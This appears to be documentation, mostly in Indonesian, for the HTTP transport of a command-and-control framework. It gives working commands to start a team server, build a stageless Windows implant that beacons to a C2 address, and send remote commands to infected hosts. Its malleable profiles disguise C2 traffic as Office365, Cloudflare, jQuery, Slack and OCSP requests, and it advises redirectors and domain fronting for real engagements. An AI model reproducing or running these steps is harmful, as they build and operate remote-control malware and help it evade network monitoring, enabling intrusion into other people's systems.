# Transport: HTTP

Default transport. Agent beacons over plain HTTP POST/GET to the team server. Easiest to set up; no extra flags needed on either side.

---

## Kapan Dipakai

- Lab / testing awal — tidak perlu sertifikat
- Target environment yang block outbound HTTPS (jarang, tapi ada)
- Ketika kamu pasang redirector/reverse proxy di depan server yang handle TLS

> **OPSEC note**: traffic plaintext, terlihat jelas di network monitoring. Jangan pakai di engagement nyata tanpa redirector atau domain fronting.

---

## Arsitektur

```
[Agent] --HTTP POST/GET--> [Team Server :8080]
```

Wire format: `POST` body berisi JSON `{ "agent_id": "...", "encrypted_payload": "<AES-GCM base64>" }`. Application-layer encryption (AES-256-GCM + ECDH session key) tetap jalan walaupun transport plaintext.

---

## Step 1 — Start Server (HTTP)

```bash
# Minimal
ENCRYPTION_KEY=MySecretKey32Chars00000000000000 go run ./cmd/server

# Full options
ENCRYPTION_KEY=MySecretKey32Chars00000000000000 \
  go run ./cmd/server \
  -port 8080 \
  -host 0.0.0.0 \
  -profile default \
  -log-level INFO \
  -log-dir ./logs \
  -db ./data/taburtuai.db
```

| Flag | Env | Default | Keterangan |
|------|-----|---------|-----------|
| `-port` | `$PORT` | `8080` | Port HTTP listener |
| `-host` | `$HOST` | `0.0.0.0` | Bind address |
| `-profile` | `$PROFILE` | `default` | Malleable HTTP profile |
| `-log-level` | `$LOG_LEVEL` | `INFO` | DEBUG / INFO / WARN / ERROR |
| `-db` | `$DB_PATH` | `./data/taburtuai.db` | SQLite database path |

**Expected log saat server ready:**
```
  [✓]  ready  ·  listening on 0.0.0.0:8080
```

---

## Step 2 — Generate Agent (HTTP)

HTTP adalah default — tidak perlu `--transport` flag.

```bash
# Default (HTTP)
go run ./cmd/generate/ stageless \
  --c2 http://192.168.1.10:8080 \
  --key MySecretKey32Chars00000000000000 \
  --interval 30 \
  --jitter 20 \
  --output bin/agent_http.exe

# Dengan malleable HTTP profile (traffic mirip jQuery CDN)
go run ./cmd/generate/ stageless \
  --c2 http://192.168.1.10:8080 \
  --key MySecretKey32Chars00000000000000 \
  --c2-profile jquery \
  --output bin/agent_jquery.exe
```

**Expected output:**
```
[*] Compiling agent (amd64/windows)...
[+] Stageless implant : bin/agent_http.exe
    Size              : 11234 KB
    SHA256            : ...
    Build time        : 2.4s
```

---

## Step 3 — Verify Checkin

Jalankan agent di target (Windows), lalu pantau server log:

```
[+] Agent checkin: <agent-id>  192.168.1.50  DESKTOP-ABC  user  windows/amd64
```

Atau query via operator console:
```bash
go run ./cmd/operator/ agents list
```

---

## Step 4 — Verify Tasking

```bash
# Kirim perintah via operator console
go run ./cmd/operator/ \
  --server http://192.168.1.10:8080 \
  --key MySecretKey32Chars00000000000000 \
  exec --agent <agent-id> --cmd "whoami"

# Lihat hasil
go run ./cmd/operator/ \
  --server http://192.168.1.10:8080 \
  --key MySecretKey32Chars00000000000000 \
  results --agent <agent-id>
```

---

## Step 5 — Verify Encryption

### Via Wireshark

Filter:
```
tcp.port == 8080 && http
```

Di packet `POST /api/v1/checkin`, expand **HTTP > Line-based text data**. Body harus terlihat seperti:
```json
{"agent_id":"a1b2c3...","encrypted_payload":"<base64-random>"}
```

Field `encrypted_payload` harus **tidak terbaca** (random base64) — bukan JSON polos. Itu konfirmasi AES-GCM bekerja.

### Via tcpdump (server side)

```bash
sudo tcpdump -i eth0 -A port 8080 2>/dev/null | grep -v "^--$" | grep encrypted_payload
```

Harus tampil: `"encrypted_payload":"...base64..."` dengan konten acak, **bukan** cleartext.

---

## Endpoint Paths per Malleable Profile

| Profile | Checkin | Poll | Result |
|---------|---------|------|--------|
| `default` | `POST /api/v1/checkin` | `GET /api/v1/command/{id}/next` | `POST /api/v1/command/result` |
| `office365` | `POST /autodiscover/autodiscover.xml` | `GET /ews/exchange.asmx/{id}` | `POST /mapi/emsmdb` |
| `cdn` | `POST /cdn-cgi/rum` | `GET /cdn-cgi/challenge-platform/h/b/flow/{id}` | `POST /cdn-cgi/zaraz/t` |
| `jquery` | `POST /assets/js/jquery-3.7.1.min.js` | `GET /assets/js/bundle.{id}.min.js` | `POST /assets/js/vendors~main.chunk.js` |
| `slack` | `POST /api/users.identity` | `GET /api/conversations.history/{id}` | `POST /api/chat.postMessage` |
| `ocsp` | `POST /ocsp` | `GET /ocsp/{id}` | `POST /crl/root.crl` |

---

## Troubleshooting

| Symptom | Penyebab | Solusi |
|---------|----------|--------|
| Agent tidak muncul di console setelah dijalankan | `--c2` URL salah atau port tidak reachable | Cek koneksi: `curl http://<server>:8080/api/v1/checkin` dari target |
| Server log: `"http listener error"` | Port sudah dipakai proses lain | Ganti port dengan `-port 9090` |
| Server log: `400 Bad Request` terus | `--key` agent tidak match `ENCRYPTION_KEY` server | Pastikan key sama persis (case-sensitive) |
| Agent crash silent | Agent build tanpa `-c2` / `-key` (binary inoperable) | Rebuild dengan flag yang benar |
| Traffic tidak terenkripsi di Wireshark | Agent lama build tanpa AES config | Rebuild agent |
